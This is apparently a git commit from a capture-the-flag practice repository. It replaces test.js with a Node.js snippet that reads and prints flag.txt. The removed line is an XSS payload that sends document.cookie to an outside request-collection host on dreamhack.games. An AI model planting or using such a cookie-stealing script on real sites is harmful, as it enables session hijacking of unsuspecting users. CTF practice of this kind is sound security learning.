a8d9f17079b39102339ad206411112e5cdfed9aa
buaii <129252044+buaii@users.noreply.github.com>
2023-11-24 13:50:18 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,10 @@
-<script>location.href="https://lolwrpo.request.dreamhack.games/"+document.cookie</script>
+const fs = require('fs');
+
+// 파일을 읽어오는 예제
+fs.readFile('flag.txt', 'utf8', (err, data) => {
+    if (err) {
+        console.error(err);
+        return;
+    }
+    console.log(data);
+});
